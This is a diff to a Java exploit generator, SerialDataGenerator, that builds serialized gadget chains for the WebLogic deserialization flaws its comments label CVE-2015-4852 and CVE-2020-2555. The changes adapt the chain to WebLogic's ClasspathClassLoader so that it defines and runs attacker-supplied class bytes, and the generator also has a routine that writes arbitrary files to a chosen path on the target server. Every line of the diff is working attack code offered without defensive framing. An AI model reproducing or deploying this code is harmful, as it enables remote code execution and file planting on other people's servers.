@@ -11,6 +11,7 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
 import org.mozilla.classfile.DefiningClassLoader;
+import weblogic.utils.classloaders.ClasspathClassLoader;
 
 import javax.management.BadAttributeValueExpException;
 import java.lang.reflect.Field;
@@ -41,7 +42,7 @@ public class SerialDataGenerator {
                 .newInstance(Override.class, lazyMap);
 
         final Map mapProxy = Map.class
-                .cast(Proxy.newProxyInstance(SerialDataGenerator.class.getClassLoader(),
+                .cast(Proxy.newProxyInstance(com.supeream.serial.SerialDataGenerator.class.getClassLoader(),
                         new Class[]{Map.class}, handler));
 
         handler = (InvocationHandler) Reflections.getFirstCtor(
@@ -76,7 +77,7 @@ public class SerialDataGenerator {
         ValueExtractor[] aExtractors = new ValueExtractor[]{
                 new ReflectionExtractor("getDeclaredConstructor", new Object[]{new Class[0]}),
                 new ReflectionExtractor("newInstance", new Object[]{new Object[0]}),
-                new ReflectionExtractor("defineClass", new Object[]{className, clsData}),
+                new ReflectionExtractor("defineCodeGenClass", new Object[]{className, clsData,null}),
                 new ReflectionExtractor("getMethod", new Object[]{"main", new Class[]{String[].class}}),
                 new ReflectionExtractor("invoke", new Object[]{null, new Object[]{bootArgs}})
         };
@@ -86,7 +87,7 @@ public class SerialDataGenerator {
         //设置LimitFilter对象的属性:m_oAnchorTop、m_comparator
         LimitFilter limitEntrance = new LimitFilter();
         limitEntrance.setComparator(extractorChain);
-        limitEntrance.setTopAnchor(DefiningClassLoader.class);
+        limitEntrance.setTopAnchor(ClasspathClassLoader.class);
 
 
         //复写入口BadAttributeValueExpException，构造valObj = evilMap
@@ -135,10 +136,10 @@ public class SerialDataGenerator {
 
         if(!flag){
             // CVE_2015_4852
-            return serialData(defineAndLoadPayloadTransformerChain(SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), bootArgs));
+            return serialData(defineAndLoadPayloadTransformerChain(com.supeream.serial.SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(com.supeream.serial.SerialDataGenerator.remoteHex), bootArgs));
         }else{
             // CVE_2020_2555
-            return Serializables.serialize(defineAndLoadPayload_CVE_2020_2555(SerialDataGenerator.REMOTE,BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), bootArgs));
+            return Serializables.serialize(defineAndLoadPayload_CVE_2020_2555(com.supeream.serial.SerialDataGenerator.REMOTE,BytesOperation.hexStringToBytes(com.supeream.serial.SerialDataGenerator.remoteHex), bootArgs));
         }
 
     }
@@ -148,7 +149,7 @@ public class SerialDataGenerator {
     }
 
     public static byte[] serialUploadDatas(String filePath, byte[] content) throws Exception {
-        return serialData(uploadTransformerChain(SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), filePath, content));
+        return serialData(uploadTransformerChain(com.supeream.serial.SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(com.supeream.serial.SerialDataGenerator.remoteHex), filePath, content));
     }
 
 }
